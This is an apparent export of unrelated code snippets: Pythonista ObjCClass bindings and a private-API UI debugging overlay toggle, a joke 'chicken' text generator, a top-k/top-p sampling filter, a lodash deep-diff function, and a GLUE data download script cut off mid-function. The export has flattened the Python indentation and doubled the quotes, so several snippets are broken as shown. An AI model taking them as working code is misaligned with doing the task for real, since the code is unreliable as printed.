UIActivityGroupViewController = ObjCClass('UIActivityGroupViewController')
UIActivityIndicatorView = ObjCClass('UIActivityIndicatorView')
UIActivityItemProvider = ObjCClass('UIActivityItemProvider')
UIActivityViewController = ObjCClass('UIActivityViewController')
UIAddToReadingListActivity = ObjCClass('UIAddToReadingListActivity')
UIAlertAction = ObjCClass('UIAlertAction')
UIAlertController = ObjCClass('UIAlertController')
UIAlertView = ObjCClass('UIAlertView')
UIAlphaAnimation = ObjCClass('UIAlphaAnimation')
UIAnimation = ObjCClass('UIAnimation')
UIAnimator = ObjCClass('UIAnimator')
UIApplication = ObjCClass('UIApplication')
UIApplicationExtensionActivity = ObjCClass('UIApplicationExtensionActivity')
UIApplicationSceneClientSettings = ObjCClass('UIApplicationSceneClientSettings')
UIApplicationSceneClientSettingsDiffInspector = ObjCClass('UIApplicationSceneClientSettingsDiffInspector')
UIApplicationSceneSettings = ObjCClass('UIApplicationSceneSettings')
UIApplicationSceneSettingsDiffInspector = ObjCClass('UIApplicationSceneSettingsDiffInspector')
UIApplicationSceneTransitionContext = ObjCClass('UIApplicationSceneTransitionContext')
UIApplicationShortcutIcon = ObjCClass('UIApplicationShortcutIcon')
UIApplicationShortcutItem = ObjCClass('UIApplicationShortcutItem')
UIAssignToContactActivity = ObjCClass('UIAssignToContactActivity')
UIAttachmentBehavior = ObjCClass('UIAttachmentBehavior')
UIAutoRotatingWindow = ObjCClass('UIAutoRotatingWindow')
UIBarButtonItem = ObjCClass('UIBarButtonItem')
UIBarButtonItemGroup = ObjCClass('UIBarButtonItemGroup')
UIBarItem = ObjCClass('UIBarItem')
UIBezierPath = ObjCClass('UIBezierPath')
UIBlurEffect = ObjCClass('UIBlurEffect')
UIBookViewController = ObjCClass('UIBookViewController')
UIButton = ObjCClass('UIButton')
UICalloutBar = ObjCClass('UICalloutBar')
UICalloutView = ObjCClass('UICalloutView')
UICheckeredPatternView = ObjCClass('UICheckeredPatternView')
UIClassicController = ObjCClass('UIClassicController')
UICollectionReusableView = ObjCClass('UICollectionReusableView')
UICollectionView = ObjCClass('UICollectionView')
UICollectionViewCell = ObjCClass('UICollectionViewCell')
UICollectionViewController = ObjCClass('UICollectionViewController')
UICollectionViewFlowLayout = ObjCClass('UICollectionViewFlowLayout')
UICollectionViewFlowLayoutInvalidationContext = ObjCClass('UICollectionViewFlowLayoutInvalidationContext')
UICollectionViewFocusUpdateContext = ObjCClass('UICollectionViewFocusUpdateContext')
UICollectionViewLayout = ObjCClass('UICollectionViewLayout')
UICollectionViewLayoutAttributes = ObjCClass('UICollectionViewLayoutAttributes')
UICollectionViewLayoutInvalidationContext = ObjCClass('UICollectionViewLayoutInvalidationContext')
UICollectionViewTransitionLayout = ObjCClass('UICollectionViewTransitionLayout')
UICollectionViewUpdateItem = ObjCClass('UICollectionViewUpdateItem')
UICollisionBehavior = ObjCClass('UICollisionBehavior')
UIColor = ObjCClass('UIColor')
UICompletionTable = ObjCClass('UICompletionTable')
UIControl = ObjCClass('UIControl')
UICopyToPasteboardActivity = ObjCClass('UICopyToPasteboardActivity')
UIDateLabel = ObjCClass('UIDateLabel')
UIDatePicker = ObjCClass('UIDatePicker')
UIDefaultKeyboardInput = ObjCClass('UIDefaultKeyboardInput')
UIDevice = ObjCClass('UIDevice')
UIDictationInputMode = ObjCClass('UIDictationInputMode')
UIDictationPhrase = ObjCClass('UIDictationPhrase')
UIDidTakeScreenshotAction = ObjCClass('UIDidTakeScreenshotAction')
UIDocument = ObjCClass('UIDocument')
UIDocumentInteractionController = ObjCClass('UIDocumentInteractionController')
UIDocumentMenuViewController = ObjCClass('UIDocumentMenuViewController')
UIDocumentPasswordField = ObjCClass('UIDocumentPasswordField')
UIDocumentPasswordView = ObjCClass('UIDocumentPasswordView')
UIDocumentPickerExtensionViewController = ObjCClass('UIDocumentPickerExtensionViewController')
UIDocumentPickerViewController = ObjCClass('UIDocumentPickerViewController')
UIDocumentStorageManager = ObjCClass('UIDocumentStorageManager')
UIDragger = ObjCClass('UIDragger')
UIDynamicAnimator = ObjCClass('UIDynamicAnimator')
UIDynamicBehavior = ObjCClass('UIDynamicBehavior')
UIDynamicItemBehavior = ObjCClass('UIDynamicItemBehavior')
UIDynamicItemGroup = ObjCClass('UIDynamicItemGroup')
UIEvent = ObjCClass('UIEvent')
UIFetchContentInBackgroundAction = ObjCClass('UIFetchContentInBackgroundAction')
UIFetchContentInBackgroundActionResponse = ObjCClass('UIFetchContentInBackgroundActionResponse')
UIFieldBehavior = ObjCClass('UIFieldBehavior')
UIFieldEditor = ObjCClass('UIFieldEditor')
UIFlicker = ObjCClass('UIFlicker')
UIFocusAnimationCoordinator = ObjCClass('UIFocusAnimationCoordinator')
UIFocusContainerGuide = ObjCClass('UIFocusContainerGuide')
UIFocusGuide = ObjCClass('UIFocusGuide')
UIFocusUpdateContext = ObjCClass('UIFocusUpdateContext')
UIFrameAnimation = ObjCClass('UIFrameAnimation')
UIGestureRecognizer = ObjCClass('UIGestureRecognizer')
UIGradient = ObjCClass('UIGradient')
UIGravityBehavior = ObjCClass('UIGravityBehavior')
UIHandleApplicationShortcutAction = ObjCClass('UIHandleApplicationShortcutAction')
UIHandleBackgroundURLSessionAction = ObjCClass('UIHandleBackgroundURLSessionAction')
UIHandleLocalNotificationAction = ObjCClass('UIHandleLocalNotificationAction')
UIHandleRemoteNotificationAction = ObjCClass('UIHandleRemoteNotificationAction')
UIHandleStatusBarTapAction = ObjCClass('UIHandleStatusBarTapAction')
UIImage = ObjCClass('UIImage')
UIImageAsset = ObjCClass('UIImageAsset')
UIImagePickerController = ObjCClass('UIImagePickerController')
UIImageView = ObjCClass('UIImageView')
UIInputView = ObjCClass('UIInputView')
UIInputViewController = ObjCClass('UIInputViewController')
UIInteractionProgress = ObjCClass('UIInteractionProgress')
UIInterpolatingMotionEffect = ObjCClass('UIInterpolatingMotionEffect')
UIKBCacheToken = ObjCClass('UIKBCacheToken')
UIKBGeometry = ObjCClass('UIKBGeometry')
UIKBMergeAction = ObjCClass('UIKBMergeAction')
UIKBRenderFactory = ObjCClass('UIKBRenderFactory')
UIKBScreenTraits = ObjCClass('UIKBScreenTraits')
UIKBShape = ObjCClass('UIKBShape')
UIKBSplitTraits = ObjCClass('UIKBSplitTraits')
UIKBTextEditingTraits = ObjCClass('UIKBTextEditingTraits')
UIKBTree = ObjCClass('UIKBTree')
UIKBTree_Compile = ObjCClass('UIKBTree_Compile')
UIKeyCommand = ObjCClass('UIKeyCommand')
UIKeyboard = ObjCClass('UIKeyboard')
UIKeyboardEmojiCategory = ObjCClass('UIKeyboardEmojiCategory')
UIKeyboardImpl = ObjCClass('UIKeyboardImpl')
UIKeyboardInputMode = ObjCClass('UIKeyboardInputMode')
UIKeyboardInputModeController = ObjCClass('UIKeyboardInputModeController')
UIKeyboardLayout = ObjCClass('UIKeyboardLayout')
UIKeyboardPreferencesController = ObjCClass('UIKeyboardPreferencesController')
UIKeyboardSuggestedInputMode = ObjCClass('UIKeyboardSuggestedInputMode')
UILabel = ObjCClass('UILabel')
UILayoutGuide = ObjCClass('UILayoutGuide')
UILexicon = ObjCClass('UILexicon')
UILexiconEntry = ObjCClass('UILexiconEntry')
UILocalNotification = ObjCClass('UILocalNotification')
UILocalizedIndexedCollation = ObjCClass('UILocalizedIndexedCollation')
UILongPressGestureRecognizer = ObjCClass('UILongPressGestureRecognizer')
UIMailActivity = ObjCClass('UIMailActivity')
UIManagedDocument = ObjCClass('UIManagedDocument')
UIMarkupTextPrintFormatter = ObjCClass('UIMarkupTextPrintFormatter')
UIMenuController = ObjCClass('UIMenuController')
UIMenuItem = ObjCClass('UIMenuItem')
UIMessageActivity = ObjCClass('UIMessageActivity')
UIModalView = ObjCClass('UIModalView')
UIMoreListController = ObjCClass('UIMoreListController')
UIMoreNavigationController = ObjCClass('UIMoreNavigationController')
UIMotionEffect = ObjCClass('UIMotionEffect')
UIMotionEffectGroup = ObjCClass('UIMotionEffectGroup')
UIMovieScrubber = ObjCClass('UIMovieScrubber')
UIMultiColumnsNavigationTransitionView = ObjCClass('UIMultiColumnsNavigationTransitionView')
UIMutableApplicationSceneClientSettings = ObjCClass('UIMutableApplicationSceneClientSettings')
UIMutableApplicationSceneSettings = ObjCClass('UIMutableApplicationSceneSettings')
UIMutableApplicationShortcutItem = ObjCClass('UIMutableApplicationShortcutItem')
UIMutableUserNotificationAction = ObjCClass('UIMutableUserNotificationAction')
UIMutableUserNotificationActionSettings = ObjCClass('UIMutableUserNotificationActionSettings')
UIMutableUserNotificationCategory = ObjCClass('UIMutableUserNotificationCategory')
UINavigationBar = ObjCClass('UINavigationBar')
UINavigationButton = ObjCClass('UINavigationButton')
UINavigationController = ObjCClass('UINavigationController')
UINavigationItem = ObjCClass('UINavigationItem')
UINavigationTransitionView = ObjCClass('UINavigationTransitionView')
UINib = ObjCClass('UINib')
UINibKeyValuePair = ObjCClass('UINibKeyValuePair')
UIOldSliderControl = ObjCClass('UIOldSliderControl')
UIOpenInIBooksActivity = ObjCClass('UIOpenInIBooksActivity')
UIOpenURLAction = ObjCClass('UIOpenURLAction')
UIPageControl = ObjCClass('UIPageControl')
UIPageController = ObjCClass('UIPageController')
UIPageControllerScrollView = ObjCClass('UIPageControllerScrollView')
UIPageViewController = ObjCClass('UIPageViewController')
UIPanGestureRecognizer = ObjCClass('UIPanGestureRecognizer')
UIPasscodeField = ObjCClass('UIPasscodeField')
UIPasteboard = ObjCClass('UIPasteboard')
UIPercentDrivenInteractiveTransition = ObjCClass('UIPercentDrivenInteractiveTransition')
UIPeripheralHost = ObjCClass('UIPeripheralHost')
UIPickerContentView = ObjCClass('UIPickerContentView')
UIPickerView = ObjCClass('UIPickerView')
UIPinchGestureRecognizer = ObjCClass('UIPinchGestureRecognizer')
UIPopoverBackgroundView = ObjCClass('UIPopoverBackgroundView')
UIPopoverController = ObjCClass('UIPopoverController')
UIPopoverPresentationController = ObjCClass('UIPopoverPresentationController')
UIPresentationController = ObjCClass('UIPresentationController')
UIPress = ObjCClass('UIPress')
UIPressesEvent = ObjCClass('UIPressesEvent')
UIPreviewAction = ObjCClass('UIPreviewAction')
UIPreviewActionGroup = ObjCClass('UIPreviewActionGroup')
UIPreviewForceInteractionProgress = ObjCClass('UIPreviewForceInteractionProgress')
UIPreviewInteractionController = ObjCClass('UIPreviewInteractionController')
UIPreviewItemController = ObjCClass('UIPreviewItemController')
UIPreviewMenuItem = ObjCClass('UIPreviewMenuItem')
UIPreviewPresentationController = ObjCClass('UIPreviewPresentationController')
UIPrintActivity = ObjCClass('UIPrintActivity')
UIPrintFormatter = ObjCClass('UIPrintFormatter')
UIPrintInfo = ObjCClass('UIPrintInfo')
UIPrintInteractionController = ObjCClass('UIPrintInteractionController')
UIPrintPageRenderer = ObjCClass('UIPrintPageRenderer')
UIPrintPaper = ObjCClass('UIPrintPaper')
UIPrinter = ObjCClass('UIPrinter')
UIPrinterPickerController = ObjCClass('UIPrinterPickerController')
UIProgressHUD = ObjCClass('UIProgressHUD')
UIProgressIndicator = ObjCClass('UIProgressIndicator')
UIProgressView = ObjCClass('UIProgressView')
UIPushBehavior = ObjCClass('UIPushBehavior')
UIReferenceLibraryViewController = ObjCClass('UIReferenceLibraryViewController')
UIRefreshControl = ObjCClass('UIRefreshControl')
UIRegion = ObjCClass('UIRegion')
UIRemoteApplication = ObjCClass('UIRemoteApplication')
UIRemoveControl = ObjCClass('UIRemoveControl')
UIResponder = ObjCClass('UIResponder')
UIRivenFactory = ObjCClass('UIRivenFactory')
UIRotationAnimation = ObjCClass('UIRotationAnimation')
UIRotationGestureRecognizer = ObjCClass('UIRotationGestureRecognizer')
UISaveToCameraRollActivity = ObjCClass('UISaveToCameraRollActivity')
UIScreen = ObjCClass('UIScreen')
UIScreenEdgePanGestureRecognizer = ObjCClass('UIScreenEdgePanGestureRecognizer')
UIScreenMode = ObjCClass('UIScreenMode')
UIScrollAnimation = ObjCClass('UIScrollAnimation')
UIScrollView = ObjCClass('UIScrollView')
UIScrubberControl = ObjCClass('UIScrubberControl')
UISearchBar = ObjCClass('UISearchBar')
UISearchContainerViewController = ObjCClass('UISearchContainerViewController')
UISearchController = ObjCClass('UISearchController')
UISearchDisplayController = ObjCClass('UISearchDisplayController')
UISearchField = ObjCClass('UISearchField')
UISearchResultsTableView = ObjCClass('UISearchResultsTableView')
UISegmentedControl = ObjCClass('UISegmentedControl')
UISimpleInteractionProgress = ObjCClass('UISimpleInteractionProgress')
UISimpleTextPrintFormatter = ObjCClass('UISimpleTextPrintFormatter')
UISiriTaskAction = ObjCClass('UISiriTaskAction')
UISlider = ObjCClass('UISlider')
UISnapBehavior = ObjCClass('UISnapBehavior')
UISnapshotView = ObjCClass('UISnapshotView')
UISocialActivity = ObjCClass('UISocialActivity')
UISplitViewController = ObjCClass('UISplitViewController')
UIStackView = ObjCClass('UIStackView')
UIStatusBar = ObjCClass('UIStatusBar')
UIStatusBarAnimationParameters = ObjCClass('UIStatusBarAnimationParameters')
UIStatusBarCorners = ObjCClass('UIStatusBarCorners')
UIStatusBarHideAnimationParameters = ObjCClass('UIStatusBarHideAnimationParameters')
UIStatusBarOrientationAnimationParameters = ObjCClass('UIStatusBarOrientationAnimationParameters')
UIStatusBarServer = ObjCClass('UIStatusBarServer')
UIStatusBarStyleAnimationParameters = ObjCClass('UIStatusBarStyleAnimationParameters')
UIStatusBarStyleRequest = ObjCClass('UIStatusBarStyleRequest')
UIStatusBarWindow = ObjCClass('UIStatusBarWindow')
UIStepper = ObjCClass('UIStepper')
UIStoryboard = ObjCClass('UIStoryboard')
UIStoryboardPopoverSegue = ObjCClass('UIStoryboardPopoverSegue')
UIStoryboardSegue = ObjCClass('UIStoryboardSegue')
UIStoryboardUnwindSegueSource = ObjCClass('UIStoryboardUnwindSegueSource')
UISwipeGestureRecognizer = ObjCClass('UISwipeGestureRecognizer')
UISwitch = ObjCClass('UISwitch')
UISystemInputViewController = ObjCClass('UISystemInputViewController')
UISystemNavigationAction = ObjCClass('UISystemNavigationAction')
UISystemNavigationActionDestinationContext = ObjCClass('UISystemNavigationActionDestinationContext')
UITabBar = ObjCClass('UITabBar')
UITabBarController = ObjCClass('UITabBarController')
UITabBarItem = ObjCClass('UITabBarItem')
UITableView = ObjCClass('UITableView')
UITableViewCell = ObjCClass('UITableViewCell')
UITableViewCellLayoutManager = ObjCClass('UITableViewCellLayoutManager')
UITableViewCellLayoutManagerValue1 = ObjCClass('UITableViewCellLayoutManagerValue1')
UITableViewController = ObjCClass('UITableViewController')
UITableViewDataSource = ObjCClass('UITableViewDataSource')
UITableViewFocusUpdateContext = ObjCClass('UITableViewFocusUpdateContext')
UITableViewHeaderFooterView = ObjCClass('UITableViewHeaderFooterView')
UITableViewRow = ObjCClass('UITableViewRow')
UITableViewRowAction = ObjCClass('UITableViewRowAction')
UITableViewSection = ObjCClass('UITableViewSection')
UITapGestureRecognizer = ObjCClass('UITapGestureRecognizer')
UITextChecker = ObjCClass('UITextChecker')
UITextContentView = ObjCClass('UITextContentView')
UITextEffectsHostingInfo = ObjCClass('UITextEffectsHostingInfo')
UITextEffectsWindow = ObjCClass('UITextEffectsWindow')
UITextField = ObjCClass('UITextField')
UITextInputAssistantItem = ObjCClass('UITextInputAssistantItem')
UITextInputController = ObjCClass('UITextInputController')
UITextInputMode = ObjCClass('UITextInputMode')
UITextInputStringTokenizer = ObjCClass('UITextInputStringTokenizer')
UITextInputTraits = ObjCClass('UITextInputTraits')
UITextInteractionAssistant = ObjCClass('UITextInteractionAssistant')
UITextLabel = ObjCClass('UITextLabel')
UITextPosition = ObjCClass('UITextPosition')
UITextRange = ObjCClass('UITextRange')
UITextRenderingAttributes = ObjCClass('UITextRenderingAttributes')
UITextSelectionRect = ObjCClass('UITextSelectionRect')
UITextTapRecognizer = ObjCClass('UITextTapRecognizer')
UITextView = ObjCClass('UITextView')
UITextViewPrintFormatter = ObjCClass('UITextViewPrintFormatter')
UIToolbar = ObjCClass('UIToolbar')
UIToolbarButton = ObjCClass('UIToolbarButton')
UITouch = ObjCClass('UITouch')
UITraitCollection = ObjCClass('UITraitCollection')
UITransformAnimation = ObjCClass('UITransformAnimation')
UITransitionView = ObjCClass('UITransitionView')
UITwoSidedAlertController = ObjCClass('UITwoSidedAlertController')
UIUnhandledBackButtonAction = ObjCClass('UIUnhandledBackButtonAction')
UIUnhandledMenuButtonAction = ObjCClass('UIUnhandledMenuButtonAction')
UIUserNotificationAction = ObjCClass('UIUserNotificationAction')
UIUserNotificationActionSettings = ObjCClass('UIUserNotificationActionSettings')
UIUserNotificationCategory = ObjCClass('UIUserNotificationCategory')
UIUserNotificationSettings = ObjCClass('UIUserNotificationSettings')
UIVibrancyEffect = ObjCClass('UIVibrancyEffect')
UIVideoEditorController = ObjCClass('UIVideoEditorController')
UIView = ObjCClass('UIView')
UIViewController = ObjCClass('UIViewController')
UIViewControllerPreviewAction = ObjCClass('UIViewControllerPreviewAction')
UIViewPrintFormatter = ObjCClass('UIViewPrintFormatter')
UIVirtualResizeAction = ObjCClass('UIVirtualResizeAction')
UIVirtualResizeResetAction = ObjCClass('UIVirtualResizeResetAction')
UIVisualEffect = ObjCClass('UIVisualEffect')
UIVisualEffectView = ObjCClass('UIVisualEffectView')
UIWKAutocorrectionContext = ObjCClass('UIWKAutocorrectionContext')
UIWKAutocorrectionRects = ObjCClass('UIWKAutocorrectionRects')
UIWKSelectionAssistant = ObjCClass('UIWKSelectionAssistant')
UIWKTextInteractionAssistant = ObjCClass('UIWKTextInteractionAssistant')
UIWatchKitExtensionRequestAction = ObjCClass('UIWatchKitExtensionRequestAction')
UIWatchKitExtensionRequestActionResponse = ObjCClass('UIWatchKitExtensionRequestActionResponse')
UIWebBrowserView = ObjCClass('UIWebBrowserView')
UIWebClip = ObjCClass('UIWebClip')
UIWebClipIcon = ObjCClass('UIWebClipIcon')
UIWebClipLinkTag = ObjCClass('UIWebClipLinkTag')
UIWebDocumentView = ObjCClass('UIWebDocumentView')
UIWebDocumentViewPrintFormatter = ObjCClass('UIWebDocumentViewPrintFormatter')
UIWebElementAction = ObjCClass('UIWebElementAction')
UIWebElementActionInfo = ObjCClass('UIWebElementActionInfo')
UIWebFormAccessory = ObjCClass('UIWebFormAccessory')
UIWebGeolocationPolicyDecider = ObjCClass('UIWebGeolocationPolicyDecider')
UIWebPDFLinkAction = ObjCClass('UIWebPDFLinkAction')
UIWebPDFSearchController = ObjCClass('UIWebPDFSearchController')
UIWebPDFSearchResult = ObjCClass('UIWebPDFSearchResult')
UIWebPDFView = ObjCClass('UIWebPDFView')
UIWebPDFViewHandler = ObjCClass('UIWebPDFViewHandler')
UIWebRotatingAlertController = ObjCClass('UIWebRotatingAlertController')
UIWebScrollView = ObjCClass('UIWebScrollView')
UIWebTiledView = ObjCClass('UIWebTiledView')
UIWebTouchEventsGestureRecognizer = ObjCClass('UIWebTouchEventsGestureRecognizer')
UIWebView = ObjCClass('UIWebView')
UIWebViewPrintFormatter = ObjCClass('UIWebViewPrintFormatter')
UIWindow = ObjCClass('UIWindow')
UIWindowController = ObjCClass('UIWindowController')
NSATSGlyphStorage = ObjCClass('NSATSGlyphStorage')
NSATSLineFragment = ObjCClass('NSATSLineFragment')
NSATSTypesetter = ObjCClass('NSATSTypesetter')
NSAttributeDictionary = ObjCClass('NSAttributeDictionary')
NSAttributeDictionaryEnumerator = ObjCClass('NSAttributeDictionaryEnumerator')
NSCIDGlyphInfo = ObjCClass('NSCIDGlyphInfo')
NSCTGlyphInfo = ObjCClass('NSCTGlyphInfo')
NSConcreteNotifyingMutableAttributedString = ObjCClass('NSConcreteNotifyingMutableAttributedString')
NSConcreteTextStorage = ObjCClass('NSConcreteTextStorage')
NSExtraLMData = ObjCClass('NSExtraLMData')
NSFont = ObjCClass('NSFont')
NSGlyphGenerator = ObjCClass('NSGlyphGenerator')
NSGlyphInfo = ObjCClass('NSGlyphInfo')
NSGlyphNameGlyphInfo = ObjCClass('NSGlyphNameGlyphInfo')
NSHTMLReader = ObjCClass('NSHTMLReader')
NSHTMLWebDelegate = ObjCClass('NSHTMLWebDelegate')
NSHTMLWriter = ObjCClass('NSHTMLWriter')
NSIdRunStorage = ObjCClass('NSIdRunStorage')
NSIdentityGlyphInfo = ObjCClass('NSIdentityGlyphInfo')
NSInsertionPointHelper = ObjCClass('NSInsertionPointHelper')
NSLayoutManager = ObjCClass('NSLayoutManager')
NSLayoutManagerTextBlockHelper = ObjCClass('NSLayoutManagerTextBlockHelper')
NSLayoutManagerTextBlockRowArrayCache = ObjCClass('NSLayoutManagerTextBlockRowArrayCache')
NSLineFragmentRenderingContext = ObjCClass('NSLineFragmentRenderingContext')
NSMutableParagraphStyle = ObjCClass('NSMutableParagraphStyle')
NSParagraphArbitrator = ObjCClass('NSParagraphArbitrator')
NSParagraphStyle = ObjCClass('NSParagraphStyle')
NSParagraphStyleExtraData = ObjCClass('NSParagraphStyleExtraData')
NSRTFReader = ObjCClass('NSRTFReader')
NSRTFReaderTableState = ObjCClass('NSRTFReaderTableState')
NSRTFWriter = ObjCClass('NSRTFWriter')
NSRunStorage = ObjCClass('NSRunStorage')
NSShadow = ObjCClass('NSShadow')
NSSingleLineTypesetter = ObjCClass('NSSingleLineTypesetter')
NSStorage = ObjCClass('NSStorage')
NSStringDrawingContext = ObjCClass('NSStringDrawingContext')
NSStringDrawingTextStorage = ObjCClass('NSStringDrawingTextStorage')
NSStringDrawingTextStorageSettings = ObjCClass('NSStringDrawingTextStorageSettings')
NSSubstituteWebResource = ObjCClass('NSSubstituteWebResource')
NSTempAttributeDictionary = ObjCClass('NSTempAttributeDictionary')
NSTextAlternatives = ObjCClass('NSTextAlternatives')
NSTextAttachment = ObjCClass('NSTextAttachment')
NSTextBlock = ObjCClass('NSTextBlock')
NSTextBlockLayoutHelper = ObjCClass('NSTextBlockLayoutHelper')
NSTextContainer = ObjCClass('NSTextContainer')
NSTextList = ObjCClass('NSTextList')
NSTextStorage = ObjCClass('NSTextStorage')
NSTextTab = ObjCClass('NSTextTab')
NSTextTable = ObjCClass('NSTextTable')
NSTextTableBlock = ObjCClass('NSTextTableBlock')
NSTypesetter = ObjCClass('NSTypesetter')
UICTFont = ObjCClass('UICTFont')
UICTFontDescriptor = ObjCClass('UICTFontDescriptor')
UIFont = ObjCClass('UIFont')
UIFontDescriptor = ObjCClass('UIFontDescriptor')
==<SEPERATOR>==
UI Debugging Overlay.py
# Pythonista script to show the UI Debugging overlay (private API) described in this blog post:
# http://ryanipete.com/blog/ios/swift/objective-c/uidebugginginformationoverlay/


from objc_util import ObjCClass, on_main_thread
UIDebuggingInformationOverlay = ObjCClass('UIDebuggingInformationOverlay')


@on_main_thread
def toggle_overlay():
 UIDebuggingInformationOverlay.prepareDebuggingOverlay()
 UIDebuggingInformationOverlay.overlay().toggleVisibility()


toggle_overlay()
==<SEPERATOR>==
generateChicken.js
export const generateChicken = () => {
 const bwwwaaaaaaaaaak = [
 ""puk"",
 ""pukaaak"",
 ""cluck"",
 ""cluck-cluck-cluck"",
 ""cluckity"",
 ""bwak"",
 ""waaak"",
 ""bok"",
 ""bwok"",
 ""cluck-a-buh-gawk"",
 ""cock-a-doodle-doo"",
 ""bwwwaaaaaaaaaak"",
 ];
 const cluckCluckCluck = [""."", ""..."", ""!"", ""?""];
 const bwok = [15, 30, 75];


 const cluckity = bwok[Math.floor(Math.random() * bwok.length)];


 // Bwok bwok Bok Cluckity. Bwak Cluck-cluck-cluck... Bok pukaaak
 let cockADoodleDoo = """";
 let cluckABuhGawk = false;
 for (let i = 0; i < cluckity; i++) {
 // Cluck... Bwok cluck
 let waaak =
 bwwwaaaaaaaaaak[Math.floor(Math.random() * bwwwaaaaaaaaaak.length)];


 // Cluck-a-buh-gawk
 // Note: Cluck cluckity Bwak Cluck-cluck-cluck Puk
 const pukaaak = i === cluckity - 1 || Math.random() > 0.9;
 const puk = pukaaak
      ? cluckCluckCluck[Math.floor(Math.random() * cluckCluckCluck.length)]
      : """";
 waaak = waaak + puk;


 // Bwok Bok bwak!
 // Note: Bwwwaaaaaaaaaak Bwwwaaaaaaaaaak Pukaaak Bok Puk?
 const cluck = i === 0 || cluckABuhGawk || Math.random() > 0.3;
 waaak = cluck ? waaak[0].toUpperCase() + waaak.slice(1) : waaak;


 // Cluck... Bwok cluck
 cluckABuhGawk = pukaaak;


 // Cluck Cluckity Bwwwaaaaaaaaaak
 cockADoodleDoo = cockADoodleDoo + waaak;


 // Bwwwaaaaaaaaaak Waaak
 cockADoodleDoo = i === cluckity - 1 ? cockADoodleDoo : cockADoodleDoo + "" "";
 }


 return cockADoodleDoo;
};
"
"top-k-top-p.py
","def top_k_top_p_filtering(logits, top_k=0, top_p=0.0, filter_value=-float('Inf')):
 """""" Filter a distribution of logits using top-k and/or nucleus (top-p) filtering
        Args:
            logits: logits distribution shape (vocabulary size)
            top_k >0: keep only top k tokens with highest probability (top-k filtering).
            top_p >0.0: keep the top tokens with cumulative probability >= top_p (nucleus filtering).
                Nucleus filtering is described in Holtzman et al. (http://arxiv.org/abs/1904.09751)
    """"""
 assert logits.dim() == 1 # batch size 1 for now - could be updated for more but the code would be less clear
 top_k = min(top_k, logits.size(-1))  # Safety check
 if top_k > 0:
 # Remove all tokens with a probability less than the last token of the top-k
 indices_to_remove = logits < torch.topk(logits, top_k)[0][..., -1, None]
 logits[indices_to_remove] = filter_value


 if top_p > 0.0:
 sorted_logits, sorted_indices = torch.sort(logits, descending=True)
 cumulative_probs = torch.cumsum(F.softmax(sorted_logits, dim=-1), dim=-1)


 # Remove tokens with cumulative probability above the threshold
 sorted_indices_to_remove = cumulative_probs > top_p
 # Shift the indices to the right to keep also the first token above the threshold
 sorted_indices_to_remove[..., 1:] = sorted_indices_to_remove[..., :-1].clone()
 sorted_indices_to_remove[..., 0] = 0


 indices_to_remove = sorted_indices[sorted_indices_to_remove]
 logits[indices_to_remove] = filter_value
 return logits


# Here is how to use this function for top-p sampling
temperature = 1.0
top_k = 0
top_p = 0.9


# Get logits with a forward pass in our model (input is pre-defined)
logits = model(input)


# Keep only the last token predictions of the first batch item (batch size 1), apply a temperature coefficient and filter
logits = logits[0, -1, :] / temperature
filtered_logits = top_k_top_p_filtering(logits, top_k=top_k, top_p=top_p)


# Sample from the filtered distribution
probabilities = F.softmax(filtered_logits, dim=-1)
next_token = torch.multinomial(probabilities, 1)
"
"difference.js
","/**
 * This code is licensed under the terms of the MIT license
 *
 * Deep diff between two object, using lodash
 * @param  {Object} object Object compared
 * @param  {Object} base   Object to compare with
 * @return {Object}        Return a new object who represent the diff
 */
function difference(object, base) {
 function changes(object, base) {
 return _.transform(object, function(result, value, key) {
 if (!_.isEqual(value, base[key])) {
 result[key] = (_.isObject(value) && _.isObject(base[key])) ? changes(value, base[key]) : value;
 }
 });
 }
 return changes(object, base);
}
==<SEPERATOR>==
download_glue_data.py
''' Script for downloading all GLUE data.

Note: for legal reasons, we are unable to host MRPC.
You can either use the version hosted by the SentEval team, which is already tokenized, 
or you can download the original data from (https://download.microsoft.com/download/D/4/6/D46FF87A-F6B9-4252-AA8B-3604ED519838/MSRParaphraseCorpus.msi) and extract the data from it manually.
For Windows users, you can run the .msi file. For Mac and Linux users, consider an external library such as 'cabextract' (see below for an example).
You should then rename and place specific files in a folder (see below for an example).

mkdir MRPC
cabextract MSRParaphraseCorpus.msi -d MRPC
cat MRPC/_2DEC3DBE877E4DB192D17C0256E90F1D | tr -d $'\r' > MRPC/msr_paraphrase_train.txt
cat MRPC/_D7B391F9EAFF4B1B8BCE8F21B20B1B61 | tr -d $'\r' > MRPC/msr_paraphrase_test.txt
rm MRPC/_*
rm MSRParaphraseCorpus.msi

1/30/19: It looks like SentEval is no longer hosting their extracted and tokenized MRPC data, so you'll need to download the data from the original source for now.
2/11/19: It looks like SentEval actually *is* hosting the extracted data. Hooray!
'''


import os
import sys
import shutil
import argparse
import tempfile
import urllib.request
import zipfile


TASKS = [""CoLA"", ""SST"", ""MRPC"", ""QQP"", ""STS"", ""MNLI"", ""QNLI"", ""RTE"", ""WNLI"", ""diagnostic""]
TASK2PATH = {""CoLA"":'https://dl.fbaipublicfiles.com/glue/data/CoLA.zip',
 ""SST"":'https://dl.fbaipublicfiles.com/glue/data/SST-2.zip',
 ""QQP"":'https://dl.fbaipublicfiles.com/glue/data/QQP-clean.zip',
 ""STS"":'https://dl.fbaipublicfiles.com/glue/data/STS-B.zip',
 ""MNLI"":'https://dl.fbaipublicfiles.com/glue/data/MNLI.zip',
 ""QNLI"":'https://dl.fbaipublicfiles.com/glue/data/QNLIv2.zip',
 ""RTE"":'https://dl.fbaipublicfiles.com/glue/data/RTE.zip',
 ""WNLI"":'https://dl.fbaipublicfiles.com/glue/data/WNLI.zip',
 ""diagnostic"":'https://dl.fbaipublicfiles.com/glue/data/AX.tsv'}


MRPC_TRAIN = 'https://dl.fbaipublicfiles.com/senteval/senteval_data/msr_paraphrase_train.txt'
MRPC_TEST = 'https://dl.fbaipublicfiles.com/senteval/senteval_data/msr_paraphrase_test.txt'


def download_and_extract(task, data_dir):
 print(""Downloading and extracting %s..."" % task)
 if task == ""MNLI"":
 print(""\tNote (12/10/20): This script no longer downloads SNLI. You will need to manually download and format the data to use SNLI."")
 data_file = ""%s.zip"" % task
 urllib.request.urlretrieve(TASK2PATH[task], data_file)
 with zipfile.ZipFile(data_file) as zip_ref:
 zip_ref.extractall(data_dir)
 os.remove(data_file)
 print(""\tCompleted!"")


def format_mrpc(data_dir, path_to_data):
 print(""Processing MRPC..."")
 mrpc_dir = os.path.join(data_dir, ""MRPC"")
 if not os.path.isdir(mrpc_dir):
 os.mkdir(mrpc_dir)
 if path_to_data:
